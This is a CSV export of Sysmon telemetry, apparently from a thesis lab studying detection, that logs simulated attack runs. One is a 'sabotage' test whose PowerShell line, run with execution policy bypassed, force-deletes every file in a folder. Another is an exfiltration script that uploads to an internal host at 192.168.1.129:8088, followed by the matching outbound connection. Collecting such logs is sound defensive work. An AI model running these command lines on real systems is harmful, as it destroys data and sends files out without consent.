_ts,ID,Timestamp,EventData,ClientId
1783860655303,1,2026-07-12T12:49:34.6364683Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:43.712"",
 ""ProcessGuid"": ""{6bc49a7d-8d67-6a53-a405-000000009a01}"",
 ""ProcessId"": 2100,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:34.6846685Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:43.751"",
 ""ProcessGuid"": ""{6bc49a7d-8d67-6a53-a505-000000009a01}"",
 ""ProcessId"": 3848,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d67-6a53-a405-000000009a01}"",
 ""ParentProcessId"": ""2100"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:34.8479648Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:43.915"",
 ""ProcessGuid"": ""{6bc49a7d-8d67-6a53-a505-000000009a01}"",
 ""ProcessId"": 3848,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_b1rgbo2l.bnr.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:43.915"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,3,2026-07-12T12:49:49.3179303Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:50:01.300"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50647"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860655303,3,2026-07-12T12:49:49.3179496Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:50:01.456"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50648"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:50.2385077Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:57.183"",
 ""ProcessGuid"": ""{6bc49a7d-8d75-6a53-a705-000000009a01}"",
 ""ProcessId"": 6920,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:50.3805587Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:57.271"",
 ""ProcessGuid"": ""{6bc49a7d-8d75-6a53-a805-000000009a01}"",
 ""ProcessId"": 7956,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d75-6a53-a705-000000009a01}"",
 ""ParentProcessId"": ""6920"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:50.7265637Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:57.562"",
 ""ProcessGuid"": ""{6bc49a7d-8d75-6a53-a805-000000009a01}"",
 ""ProcessId"": 7956,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jw1sigfa.qlo.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:57.554"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:57.0048652Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:02.702"",
 ""ProcessGuid"": ""{6bc49a7d-8d7a-6a53-a905-000000009a01}"",
 ""ProcessId"": 9116,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:57.0389809Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:02.725"",
 ""ProcessGuid"": ""{6bc49a7d-8d7a-6a53-aa05-000000009a01}"",
 ""ProcessId"": 8668,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d7a-6a53-a905-000000009a01}"",
 ""ParentProcessId"": ""9116"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:57.1824614Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:02.855"",
 ""ProcessGuid"": ""{6bc49a7d-8d7a-6a53-aa05-000000009a01}"",
 ""ProcessId"": 8668,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpriqwb0.3xz.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:50:02.855"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:23.7401237Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:28.528"",
 ""ProcessGuid"": ""{6bc49a7d-8d94-6a53-ac05-000000009a01}"",
 ""ProcessId"": 8024,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:23.7813507Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:28.562"",
 ""ProcessGuid"": ""{6bc49a7d-8d94-6a53-ad05-000000009a01}"",
 ""ProcessId"": 6448,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d94-6a53-ac05-000000009a01}"",
 ""ParentProcessId"": ""8024"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:50:23.9589463Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:28.759"",
 ""ProcessGuid"": ""{6bc49a7d-8d94-6a53-ad05-000000009a01}"",
 ""ProcessId"": 6448,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cajtbvlt.ljf.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:50:28.759"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:41.0789816Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:49.188"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-af05-000000009a01}"",
 ""ProcessId"": 1780,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\"" -ReceiverUrl \""http://192.168.1.129:8088/upload\"" -TimeoutSec 60 -EnableUpload -KeepArtifacts"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:41.1552215Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:49.258"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-b005-000000009a01}"",
 ""ProcessId"": 11476,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\"" -ReceiverUrl \""http://192.168.1.129:8088/upload\"" -TimeoutSec 60 -EnableUpload -KeepArtifacts"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8da9-6a53-af05-000000009a01}"",
 ""ParentProcessId"": ""1780"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\"" -ReceiverUrl \""http://192.168.1.129:8088/upload\"" -TimeoutSec 60 -EnableUpload -KeepArtifacts"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:50:41.3922558Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:49.584"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-b005-000000009a01}"",
 ""ProcessId"": 11476,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oezp3b3i.tys.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:50:49.584"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,3,2026-07-12T12:50:43.2804546Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:54.117"",
 ""ProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ProcessId"": 12104,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""true"",
 ""SourceIsIpv6"": ""false"",
 ""SourceIp"": ""192.168.1.143"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50651"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""false"",
 ""DestinationIp"": ""192.168.1.129"",
 ""DestinationHostname"": ""-"",
 ""DestinationPort"": ""8088"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:50:52.5313286Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:51:02.711"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50652"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:50:52.5313518Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:51:02.726"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50653"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
